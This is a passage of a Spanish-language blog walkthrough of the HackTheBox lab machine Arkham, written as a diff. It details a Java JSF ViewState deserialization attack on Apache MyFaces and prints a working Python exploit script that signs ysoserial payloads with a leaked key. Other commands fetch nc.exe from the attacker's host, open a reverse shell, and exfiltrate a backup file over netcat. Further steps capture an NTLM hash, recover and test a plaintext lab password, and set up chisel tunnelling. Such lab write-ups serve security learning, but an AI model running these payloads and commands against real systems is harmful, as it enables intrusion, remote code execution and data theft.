+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179page8080.png" alt="179page8080" /></p>
+
+<p>Opa, un servicio web con info, el único recurso funcional es <code>Subscription</code> que nos redirecciona a:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179page8080_subscription.png" alt="179page8080_subscription" /></p>
+
+<p>A primera vista no hay nada interesante, pero si nos vamos al código fuente tenemos:</p>
+
+<pre><code class="language-html">...
+&lt;form id="j_id_jsp_1623871077_1" name="j_id_jsp_1623871077_1" method="post" action="/userSubscribe.faces" enctype="application/x-www-form-urlencoded"&gt;
+  &lt;table&gt;
+    &lt;tbody&gt;
+      &lt;tr&gt;
+        &lt;td&gt;
+          &lt;input id="j_id_jsp_1623871077_1:email" name="j_id_jsp_1623871077_1:email" type="text" value="" style="margin-left:50px;" class="button" /&gt;
+        &lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/tbody&gt;
+  &lt;/table&gt;
+  &lt;input id="j_id_jsp_1623871077_1:submit" name="j_id_jsp_1623871077_1:submit" type="submit" value="SIGN UP" style="cursor: pointer" class="button" /&gt;
+  &lt;input type="hidden" name="j_id_jsp_1623871077_1_SUBMIT" value="1" /&gt;
+  &lt;input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=" /&gt;
+&lt;/form&gt;
+...
+</code></pre>
+
+<p>Tenemos campos escondidos y uno que juega con el componente <code>javax.faces</code>… Pues buscando en internet sobre él, tenemos que es un framework de <strong>Java</strong> (JavaServer Faces) usado para generar aplicaciones basadas en interfaces de usuario (UI).</p>
+
+<ul>
+  <li><a href="http://www.jtech.ua.es/j2ee/publico/jsf-2012-13/sesion01-apuntes.html">Introducción a <strong>JavaServer Faces</strong></a>.</li>
+  <li><a href="https://en.wikipedia.org/wiki/Jakarta_Server_Faces">JavaServer Faces - Wikipedia</a>.</li>
+</ul>
+
+<p>Bien, el campo juguetón es medio extraño, indagando sobre <strong>javax.faces exploit</strong> encontramos recursos interesantes:</p>
+
+<ul>
+  <li><a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a">How i found a 1500$ worth Deserialization vulnerability</a>.</li>
+  <li><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a>.</li>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization">Java JSF ViewState (.faces) Deserialization</a>.</li>
+</ul>
+
+<p>Y si, efectivamente, varios recursos hablando sobre vulnerabilidades de deserializacion (que tanto me gustan), así que definamos rápidamente que es eso de “deserializacion”:</p>
+
+<blockquote>
+  <p>En pocas palabras (pocas realmente, hechenle un ojo por su parte, es super interesante). La <a href="https://www.glosarioit.com/Deserializaci%C3%B3n">deserializacion</a> es convertir un conjunto de bytes que viajan por la red a un unico objeto. (La serializacion seria lo contrario).</p>
+</blockquote>
+
+<p>Sencillito no?</p>
+
+<p>El problema surge cuando no están bien configurados los servicios o no se valida el contenido de lo que viaja al crear un objeto, lo que nos permite aprovecharnos del proceso, ya que mientras se genera el objeto podemos inyectar cositas en la mitad. Lo más probable es que el proceso nos dé un error (ya que estamos modificando el objeto por lo tanto su estructura) pero no nos interesara, porque el proceso fallo precisamente después de haber leído nuestras instrucciones inyectadas, por lo tanto si todo va bien, las habrá ejecutado ;)</p>
+
+<p>(Es un lindo tema)</p>
+
+<ul>
+  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">Deserialization Cheat Sheet</a>.</li>
+  <li><a href="https://portswigger.net/web-security/deserialization">Insecure deserialization</a>.</li>
+  <li><a href="https://snyk.io/blog/serialization-and-deserialization-in-java/">Serialization and deserialization in Java</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Listo, indagando específicamente en los recursos encontrados sobre <strong>javax.faces exploit</strong> hablan del campo <code>javax.faces.ViewState</code> que se encarga de guardar el estado actual de la sesión, por ejemplo para indicarle al servidor que partes de la web deberíamos ver. El campo puede ser manejado desde el <strong>servidor</strong> y el <strong>cliente</strong> y es enviado de vuelta una vez el formulario (en nuestro caso) sea generado.</p>
+
+<p>Por lo general se implementan en dos procesos:</p>
+
+<ul>
+  <li>Oracle Mojarra (JSF reference implementation).</li>
+  <li>Apache MyFaces.</li>
+</ul>
+
+<p>Bien, si seguimos indagando vemos que el campo contiene data serializada :O Opa, empieza a tomar sentido…</p>
+
+<p>Ahora, vimos que se puede implementar en dos procesos, nos enfocaremos en el segundo, <strong>Apache MyFaces</strong>. Pero ¿por qué? Vale, recordemos el archivo <code>web.xml.bak</code>, en los artículos referencian un campo del archivo llamado <code>javax.faces.STATE_SAVING_METHOD</code> el cual puede tener o <strong>server</strong> o <strong>client</strong> (lo que hablamos antes):</p>
+
+<pre><code class="language-bash">❭ cat web.xml.bak | grep SAVING -A 1
+&lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;
+&lt;param-value&gt;server&lt;/param-value&gt;
+</code></pre>
+
+<p>Como en nuestro caso tenemos <strong>server</strong> y en las referencias indican que para tener un vector de ataque satisfactorio debemos contar con:</p>
+
+<blockquote>
+  <p>Campo <strong>ViewState</strong> <a href="https://www.codeproject.com/Articles/150688/How-to-Make-ViewState-Secure-in-ASP-NET">desencriptado</a> (por lo que si hacemos un <code>base64 -d</code> deberiamos ver un formato Java).
+In case of <strong>Mojarra</strong>: ViewState configured to reside on the <strong>client</strong>.
+In case of <strong>MyFaces</strong>: ViewState configured to reside on the <strong>client</strong> or the <strong>server</strong>.</p>
+</blockquote>
+
+<p>Por lo tanto descartamos a <strong>Mojarra</strong> :)</p>
+
+<p>…</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization#apache-myfaces">ViewState - Apache MyFaces</a>.</li>
+</ul>
+
+<p>Entonces, veamos que contiene la cadena en <strong>base64</strong>:</p>
+
+<pre><code class="language-bash">❭ echo "wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=" | base64 -d
+z4b#-F!e)x8~r\LE
+                S.IB9aH;ҁ^gOTfeL
+</code></pre>
+
+<p>Y pues no :P Asi que podemos entender que esta encriptado :(</p>
+
+<p>Peeeeeeeeeeeeeeeeeeero, sabemos que contamos (presuntamente) con una vulnerabilidad de deserializacion ante ese campo, yyyyyyyyyyy si volvemos al archivo <code>web.xml.bak</code> vemos otra cadena en <strong>base64</strong> pero hacienod referencia a un secreto y cositas de encriptacion:</p>
+
+<pre><code class="language-xml">&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+    &lt;context-param&gt;
+        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;
+        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;
+     &lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+...
+</code></pre>
+
+<pre><code class="language-bash">❭ echo "SnNGOTg3Ni0=" | base64 -d
+JsF9876-
+</code></pre>
+
+<p>Parece insignificante, pero si volvemos al artículo al final hay un script que usa una llave (curiosamente la misma) para convertir payloads normalitos y feitos a payloads firmados con la llave :)</p>
+
+<p>Pues nada, ahora nos queda crear los payloads, nos podemos apoyar de <a href="https://github.com/frohoff/ysoserial">ysoserial</a> que ayuda a generar payloads que explotan vulnerabilidades de deserialización en <strong>Java</strong>:</p>
+
+<p>Descargamos el binario y ejecutamos para ver todos los tipos de payload que podemos usar:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_ysoserial_payloads.png" alt="179bash_ysoserial_payloads" /></p>
+
+<p>Uff varios, lo mejor será crear un script para generar los payloads y que al mismo tiempo haga las peticiones web hacia el campo “vulnerable” a ver si logramos explotar alguna deserializacion… Extraemos el nombre de cada payload para generar un array después:</p>
+
+<pre><code class="language-bash">❭ curl -s https://github.com/frohoff/ysoserial | grep Payload -A 35 | awk '{print $1}' | tail -n 34 &gt; payloadsYSO
+# O tambien asi:
+❭ wget https://github.com/frohoff/ysoserial
+❭ cat ysoserial | grep Payload -A 35 | awk '{print $1}' | tail -n 34 &gt; payloadsYSO
+</code></pre>
+
+<p>Ya tendríamos los payloads, démosle el formato de array:</p>
+
+<pre><code class="language-bash">❭ for i in $(cat payloadsYSO); do echo -n "'$i',"; done
+'AspectJWeaver','BeanShell1','C3P0','Click1','Clojure','CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3','CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','FileUpload1','Groovy1','Hibernate1','Hibernate2','JBossInterceptors1','JRMPClient','JRMPListener','JSON1','JavassistWeld1','Jdk7u21','Jython1','MozillaRhino1','MozillaRhino2','Myfaces1','Myfaces2','ROME','Spring1','Spring2','URLDNS','Vaadin1','Wicket1',
+</code></pre>
+
+<p>Listo, ahora si los tenemos, después de un rato probando cositas creamos este script:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import hashlib, hmac
+import requests
+import base64
+import time
+import os
+from pyDes import *
+
+payloads = [
+    'AspectJWeaver','BeanShell1','C3P0','Click1','Clojure','CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3',
+    'CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','FileUpload1','Groovy1','Hibernate1','Hibernate2',
+    'JBossInterceptors1','JRMPClient','JRMPListener','JSON1','JavassistWeld1','Jdk7u21','Jython1','MozillaRhino1','MozillaRhino2','Myfaces1',
+    'Myfaces2','ROME','Spring1','Spring2','URLDNS','Vaadin1','Wicket1'
+]
+
+# Firmamos el payload
+# * https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization#custom-encryption
+def encrypt(payload,key):
+    cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)
+    enc_payload = cipher.encrypt(payload)
+    return enc_payload
+
+def hmac_siga(enc_payload,key):
+    hmac_sig = hmac.new(key, enc_payload, hashlib.sha1)
+    hmac_sig = hmac_sig.digest()
+    return hmac_sig
+
+url = "http://10.10.10.130:8080"
+key = b'JsF9876-'
+
+def sign_payload(cmd):
+    '''
+    Ejecutar comandos en el sistema y jugar con el output
+    * https://python-para-impacientes.blogspot.com/2014/02/ejecutar-un-comando-externo.html
+    '''
+    for payload in payloads:
+        print("Enviando " + payload)
+
+        # Generamos payload
+        # https://stackoverflow.com/questions/42339876/error-unicodedecodeerror-utf-8-codec-cant-decode-byte-0xff-in-position-0-in
+        os.system('java -jar ysoserial.jar %s "%s" &gt; %s.txt' % (payload, cmd, payload))
+        payload_file = open('./' + payload + '.txt', 'rb')
+
+        # Firmamos payload
+        enc_payload = encrypt(payload_file.read(),key)
+        hmac_sig = hmac_siga(enc_payload,key)
+
+        # Pasamos a base64
+        final_payload = base64.b64encode(enc_payload + hmac_sig)
+
+        payload_file.close()
+
+        data_post = {
+            "j_id_jsp_1623871077_1:email" : "aaaaaaaaa", 
+            "j_id_jsp_1623871077_1:submit" : "SIGN UP",
+            "j_id_jsp_1623871077_1_SUBMIT" : "1",
+            "javax.faces.ViewState" : final_payload
+        }
+
+        session = requests.Session()
+        r = session.post(url + '/userSubscribe.faces', data=data_post)
+
+        # Borramos los archivos creados de cada payload (por un problema tuve que hacerlo asi).
+        os.system("shred -zun 10 %s.txt" % (payload))
+
+# Enviamos el comando
+sign_payload("ping -n 1 10.10.14.14")
+</code></pre>
+
+<p>Entonces generamos el payload, que dentro de él va a tener el comando <code>ping -n 1 10.10.14.14</code>, por lo tanto si se ejecuta deberíamos recibir una petición <strong>ICMP</strong> hacia nuestra máquina. Pongámonos en escucha para ver que llega hacia el protocolo <strong>ICMP</strong> en la red:</p>
+
+<pre><code class="language-bash">❭ tshark -i tun0 -Y "icmp" 2&gt;/dev/null
+</code></pre>
+
+<p>Hagamos un ejemplo rápido de lo que hace el script:</p>
+
+<p><span>1. </span>Generamos payload.</p>
+
+<pre><code class="language-bash">❭ java -jar ysoserial.jar Click1 'ping -n 1 10.10.14.14' &gt; clickpayload.txt
+❭ strings clickpayload.txt
+java.util.PriorityQueue
+sizeL
+...
+❭ file clickpayload.txt 
+clickpayload.txt: Java serialization data, version 5
+</code></pre>
+
+<p><span>2. </span>Firmamos el payload.</p>
+
+<p><span>3. </span>Convertimos el payload a base64 para pasárselo al campo <strong>ViewState</strong>.</p>
+
+<pre><code class="language-bash">❭ cat clickpayload.txt | base64 | tr -d '\n'
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4Kx...
+</code></pre>
+
+<p><span>4. </span>Enviamos la petición :P</p>
+
+<p>…</p>
+
+<p>Listo, pues ejecutando el script y estando atentos tenemos respuesta cuando llega a estos payloads:</p>
+
+<pre><code class="language-py">❭ python3 validatePayload.py
+...
+Enviando CommonsCollections5
+Enviando CommonsCollections6
+Enviando CommonsCollections7
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_tshark_pingDONE.png" alt="179bash_tshark_pingDONE" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179google_gif_hypeoverload.gif" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Bien, pues borrando la mayoría de payloads y quedándonos con los cercanos a estos tres podemos validar realmente que tenemos ejecución de comandos remotamenteeeeeeeeeeeeeeeeeeeeeee :D</p>
+
+<p>Listoooooooo, generemos una Reverse Shell. Pongámonos en escucha con netcat, <code>nc -lvp 4433</code>.</p>
+
+<p>Intentando con <strong>PowerShell</strong> (y sus variaciones), con <strong>certutil</strong> y finalmente con <strong>cURL</strong> subir el binario <code>nc.exe</code>, logramos con este último recibir las 3 peticiones en nuestro servidor web:</p>
+
+<pre><code class="language-py">...
+sign_payload("curl http://10.10.14.14:8000/nc.exe -o C:\\Windows\\Temp\\nc.exe'")
+</code></pre>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.130 - - [26/Apr/2021 25:25:25] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.130 - - [26/Apr/2021 25:25:25] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.130 - - [26/Apr/2021 25:25:25] "GET /nc.exe HTTP/1.1" 200 -
+</code></pre>
+
+<p>Pero al generar la reverse shell:</p>
+
+<pre><code class="language-py">...
+sign_payload("C:\\Windows\\Temp\\nc.exe 10.10.14.14 4433 -e cmd.exe")
+</code></pre>
+
+<p>No pasa nada :( Asi que probablemente la ruta en la que estemos subiendo el archivo no exista. A jugar y probar cositas…</p>
+
+<ul>
+  <li><a href="https://www.askvg.com/where-does-windows-store-temporary-files-and-how-to-change-temp-folder-location/?__cf_chl_jschl_tk__=812d45995163fa039197bffdf31c5b8cabe0f062-1619536286-0-AZd7w3DpGArvac7iIIctQoNmgNStxtK3jib0xeNtJ6b1JGaz2Jnhie4KmOTNrRN6e_IIZR0GluumpmtlDom5VkSnLETLoFHBkaXh-yy6c3DlXFxs_6eqzoSl6KPdu9y8LCUqSPl4A9x5uuTr-A_VLZwfxNuQyG6QAfFs7NtbszztbvodTIThfqrWg7BI0tFh0HK_oTufa-j81Qm9_zJCg_M7reh2IV-7ECaWBIDIUtFF09b8iGpPlIq_1eTgqqKZKTqnGWGBpJyarfDmulFcJeM2UXMb5vHEcN-tb4Wjudun2nogOjqL1zXs4mZ3C2WGLtspWVafZBjzI7rC-xtrntGdG6ZzLYWykBhC1mf6aXLTE-m6ThY0sDsNyeB9FgI_RocT8d5wKXye1_nqIpAutHweTe83R2e4-XoOkBQ6yidlmzJAvapgnFOAhQKJiZLO_L4eYzqZkEfJcWqNBW6K0svtyiic-TsB6l4Ac0MVI7uRGz2aVOJABggxJeZ1sHZnWg">Where Does Windows Store Temporary Files and How to Change TEMP Folder Location?</a>.</li>
+</ul>
+
+<p>Siguiendo la guía citada, vemos que la ruta anterior también puede encontrarse como <code>TEMP/</code>, así que probemos:</p>
+
+<pre><code class="language-py">...
+sign_payload("curl http://10.10.14.14:8000/nc.exe -o C:\\Windows\\TEMP\\nc.exe'")
+sign_payload("C:\\Windows\\TEMP\\nc.exe 10.10.14.14 4433 -e cmd.exe")
+</code></pre>
+
+<p>Recibimos petición y en nuestro listeneeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_alfred_revSH.png" alt="179bash_alfred_revSH" /></p>
+
+<p>Listooooones, a darleeeeeeeeeeeeeeeeee!!</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral-alfred-batman">Movimiento lateral : Alfred -&gt; Batman <a href="#movimiento-lateral-alfred-batman">#</a></h2>
+
+<p>Enumerando un poco sobre el directorio <code>C:\Users</code> vemos:</p>
+
+<pre><code class="language-powershell">c:\Users&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of c:\Users
+
+02/03/2019  06:54 PM    &lt;DIR&gt;          .
+02/03/2019  06:54 PM    &lt;DIR&gt;          ..
+02/03/2019  09:26 AM    &lt;DIR&gt;          Administrator
+02/03/2019  06:31 PM    &lt;DIR&gt;          Alfred
+02/02/2019  10:48 AM    &lt;DIR&gt;          Batman
+02/03/2019  06:54 PM    &lt;DIR&gt;          Guest
+02/01/2019  08:19 AM    &lt;DIR&gt;          Public
+               0 File(s)              0 bytes
+               7 Dir(s)   8,718,667,776 bytes free
+
+c:\Users&gt;
+</code></pre>
+
+<p>Profundizando en el directorio <code>C:\Users\Alfred</code> encontramos un archivo <code>.zip</code>:</p>
+
+<pre><code class="language-powershell">c:\Users\Alfred\Downloads\backups&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of c:\Users\Alfred\Downloads\backups
+
+04/27/2021  10:24 PM    &lt;DIR&gt;          .
+04/27/2021  10:24 PM    &lt;DIR&gt;          ..
+02/03/2019  08:41 AM           124,257 backup.zip
+               1 File(s)        124,257 bytes
+               2 Dir(s)   8,722,964,480 bytes free
+
+c:\Users\Alfred\Downloads\backups&gt;
+</code></pre>
+
+<p>Movámoslo a nuestra máquina, probando mediante una carpeta compartida con <strong>SMB</strong>:</p>
+
+<pre><code class="language-bash">❭ smbserver.py smbFolder $(pwd) -smb2support
+Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-powershell">c:\Users\Alfred\Downloads\backups&gt;copy backup.zip \\10.10.14.14\smbFolder\backup.zip
+You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+        0 file(s) copied.
+
+c:\Users\Alfred\Downloads\backups&gt;
+</code></pre>
+
+<p>Y en el servidor <strong>SMB</strong> recibimos el hash <a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">Net-NTLMv2</a> del usuario <strong>Alfred</strong>, pero intentando crackearlo no logramos nada :(</p>
+
+<pre><code class="language-bash">...
+[*] Incoming connection (10.10.10.130,49707)
+[*] AUTHENTICATE_MESSAGE (ARKHAM\Alfred,ARKHAM)
+[*] User ARKHAM\Alfred authenticated successfully
+[*] Alfred::ARKHAM:aaaaaaaa:7788c08b972d046d3204856b5e605c9c:010100000000000080a2169c763ad701bdc49d05e3f6764400000000010010007a0072006e00520070007200720041000200100062007a0069004c0049004d004e004f00030010007a0072006e00520070007200720041000400100062007a0069004c0049004d004e004f000700080080a2169c763ad70106000400020000000800300030000000000000000000000000200000501679800e3ec4fec38e468143ba78a69d3112f8176260dbae0bf0d0fce82c1d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000
+[*] Closing down connection (10.10.10.130,49707)
+...
+</code></pre>
+
+<p>Después recordamos una manera mediante <strong>netcat</strong>, aprovechando que ya lo subimos podemos ejecutar el proceso.</p>
+
+<p>Nos ponemos en escucha y guardamos el output en un archivo llamado <code>backup.zip</code>:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4434 &gt; backup.zip
+listening on [any] 4434 ...
+</code></pre>
+
+<p>Y en la máquina Windows indicamos que lea el contenido del archivo <code>backup.zip</code>, espere 5 segundos como máximo y envíe el resultado a nuestro listener:</p>
+
+<pre><code class="language-powershell">c:\Users\Alfred\Downloads\backups&gt;C:\\Windows\\TEMP\\nc.exe -w 5 10.10.14.14 4434 &lt; backup.zip
+</code></pre>
+
+<p>Recibimos:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4434 &gt; backup.zip
+listening on [any] 4434 ...
+10.10.10.130: inverse host lookup failed: Host name lookup failure
+connect to [10.10.14.14] from (UNKNOWN) [10.10.10.130] 49743
+</code></pre>
+
+<p>Y validando:</p>
+
+<pre><code class="language-bash">❭ ls 
+backup.zip
+</code></pre>
+
+<p>Bien, veamos que contiene:</p>
+
+<pre><code class="language-bash">❭ unzip backup.zip
+Archive:  backup.zip
+  inflating: alfred@arkham.local.ost
+</code></pre>
+
+<blockquote>
+  <p>Offline Outlook Data File (.ost) file is used to store a synchronized copy of your mailbox information on your local computer. <a href="https://support.microsoft.com/en-us/office/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790">Offline Outlook Data File (.ost)</a>.</p>
+</blockquote>
+
+<p>Opa, entonces tenemos los directorios de un correo (en este caso de <strong>alfred</strong>) 😮</p>
+
+<p>Bien pues buscando en internet encontramos la herramienta <a href="https://linux.die.net/man/1/readpst">readpst</a> para convertir este tipo de archivos un formato distinto, por default a un archivo <code>.mbox</code>:</p>
+
+<pre><code class="language-bash">❭ readpst alfred@arkham.local.ost
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+Processing Folder "Inbox"
+Processing Folder "Outbox"
+Processing Folder "Sent Items"
+Processing Folder "Calendar"
+Processing Folder "Contacts"
+Processing Folder "Conversation Action Settings"
+Processing Folder "Drafts"
+Processing Folder "Journal"
+Processing Folder "Junk E-Mail"
+Processing Folder "Notes"
+Processing Folder "Tasks"
+Processing Folder "Sync Issues"
+Processing Folder "RSS Feeds"
+Processing Folder "Quick Step Settings"
+        "alfred@arkham.local.ost" - 15 items done, 0 items skipped.
+        "Calendar" - 0 items done, 3 items skipped.
+Processing Folder "Conflicts"
+Processing Folder "Local Failures"
+Processing Folder "Server Failures"
+        "Sync Issues" - 3 items done, 0 items skipped.
+        "Drafts" - 1 items done, 0 items skipped.
+        "Inbox" - 0 items done, 7 items skipped.
+</code></pre>
+
+<p>Si enfocamos la vista, vemos que simplemente recupero contenido de un “folder” llamado <strong>Server Failures -&gt; Drafts</strong>, si validamos tenemos efectivamente un archivo llamado <code>Drafts.mbox</code>:</p>
+
+<pre><code class="language-bash">❭ ls
+alfred@arkham.local.ost  backup.zip  Drafts.mbox
+</code></pre>
+
+<p>Leyendo el archivo normalmente, vemos varias cositas:</p>
+
+<pre><code class="language-bash">...
+From "MAILER-DAEMON" Thu Jan 1 00:00:00 1970
+From: &lt;MAILER-DAEMON&gt;
+Subject: 
+To: batman
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_cat_draftsMbox.png" alt="179bash_cat_draftsMbox" /></p>
+
+<p>Opa, vemos un mensaje hacia Wayne (Batman) para que deje de olvidarse de su contraseña y adjunto lleva una imagen en formato <strong>Base64</strong>. Entonces tomando el contenido encodeado y copiándolo a un archivo que llamaremos <code>base64.txt</code> para posteriormente decodearlo (<code>cat base64.txt | base64 -d &gt; loquesea.png</code>) y guardar el output en uno llamado <code>loquesea.png</code> tendríamos finalmente:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_display_loqueseaPNG.png" alt="179bash_display_loqueseaPNG" /></p>
+
+<p>OHHH, unas credenciales de un usuario llamado <strong>batman</strong>, si recordamos, antes vimos que entre los usuarios del sistema tenemos uno llamado <strong>Batman</strong>, así que copiémonos la contraseña:</p>
+
+<pre><code class="language-txt">Batman : Zx^#QZX+T!123
+</code></pre>
+
+<p>Validándola borrando un número y después completa tenemos:</p>
+
+<pre><code class="language-bash">❭ crackmapexec smb 10.10.10.130 -u Batman -p 'Zx^#QZX+T!12'
+SMB         10.10.10.130    445    ARKHAM           [*] Windows 10.0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)
+SMB         10.10.10.130    445    ARKHAM           [-] ARKHAM\Batman:Zx^#QZX+T!12 STATUS_LOGON_FAILURE
+</code></pre>
+
+<p>Y ahora bien:</p>
+
+<pre><code class="language-bash">❭ crackmapexec smb 10.10.10.130 -u Batman -p 'Zx^#QZX+T!123'
+SMB         10.10.10.130    445    ARKHAM           [*] Windows 10.0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)
+SMB         10.10.10.130    445    ARKHAM           [+] ARKHAM\Batman:Zx^#QZX+T!123
+</code></pre>
+
+<p>Perfecto, son válidas :) Pero validando con <strong>psexec</strong>, con <strong>wmiexec</strong> y con <strong>crackmapexec</strong> no logramos obtener una Shell como <strong>Batman</strong>.</p>
+
+<p>Enumerando los servicios corriendo en la máquina internamente tenemos uno interesante, ¿lo ves?:</p>
+
+<pre><code class="language-powershell">c:\Users\Alfred\Videos&gt;netstat -a
+netstat -a
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:80             ARKHAM:0               LISTENING
+  TCP    0.0.0.0:135            ARKHAM:0               LISTENING
+  TCP    0.0.0.0:445            ARKHAM:0               LISTENING
+  TCP    0.0.0.0:5985           ARKHAM:0               LISTENING
+  TCP    0.0.0.0:8009           ARKHAM:0               LISTENING
+  TCP    0.0.0.0:8080           ARKHAM:0               LISTENING
+  TCP    0.0.0.0:47001          ARKHAM:0               LISTENING
+  TCP    0.0.0.0:49664          ARKHAM:0               LISTENING
+  TCP    0.0.0.0:49665          ARKHAM:0               LISTENING
+  TCP    0.0.0.0:49666          ARKHAM:0               LISTENING
+  TCP    0.0.0.0:49667          ARKHAM:0               LISTENING
+  TCP    0.0.0.0:49668          ARKHAM:0               LISTENING
+  TCP    0.0.0.0:49669          ARKHAM:0               LISTENING
+...
+</code></pre>
+
+<p>Efectivamente, tenemos el puerto <strong>5985</strong> que generalmente sirve el servicio <a href="https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/">WinRM</a> (Windows Remote Management) el cual entre muchas cosas brinda una interfaz de comandos para realizar tareas de administración en el sistema. Hay una utilidad conocida y muy linda llamada <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> que explota el servicio para proveer una PowerShell completamente interactiva. Pero no podemos usarla así de la nada, ya que el puerto está sirviendo, pero internamente, entonces juguemos con <a href="https://github.com/jpillora/chisel">chisel</a> para generar un <strong>Remote Port Forwarding</strong>, permitiendo así que el puerto <strong>5985</strong> de la máquina <strong>10.10.10.130</strong> (internamente <strong>127.0.0.1</strong>) se convierta en un puerto cualquiera de nuestra máquina atacante (<strong>10.10.14.14</strong>), entonces podremos acceder al puerto desde nuestro sistema y lograr ejecutar <strong>evil-winrm</strong>.</p>
+
+<ul>
+  <li><a href="https://www.zonasystem.com/2019/01/tunel-ssh-port-forwarding-local-remote-dynamic.html">Explicación tipos de reenvios de puertos (port forwarding) mediante <em>SSH</em>. (Quedense con las definiciones :P)</a>.</li>
+</ul>
+
+<h3 id="remote-port-forwarding">Remote Port Forwarding</h3>
+
+<p>Subamos el binario <a href="https://github.com/jpillora/chisel">chisel</a> a la máquina Windows:</p>
+
+<ul>
+  <li>Descargamos el comprimido para Windows: <a href="https://github.com/jpillora/chisel/releases/tag/v1.7.6">chisel_1.7.6_windows_amd64.gz</a>.</li>
+  <li>Descomprimimos y cambiamos nombre a uno más sencillo.exe :P</li>
+  <li>Descargamos el comprimido para Linux: <a href="https://github.com/jpillora/chisel/releases/tag/v1.7.6">chisel_1.7.6_linux_amd64.gz</a>.</li>
+  <li>Descomprimimos y cambiamos nombre a otro más sencillo :)</li>
+  <li>Subimos el binario <code>.exe</code> a la máquina: <code>powershell IWR -uri http://10.10.14.14:8000/chisel.exe -OutFile chisel.exe</code>.</li>
+  <li>Validamos que la version de los dos binarios sea la misma simplemente ejecutandolos: <strong>Version: 1.7.6 (go1.16rc1)</strong>.</li>
+</ul>
+
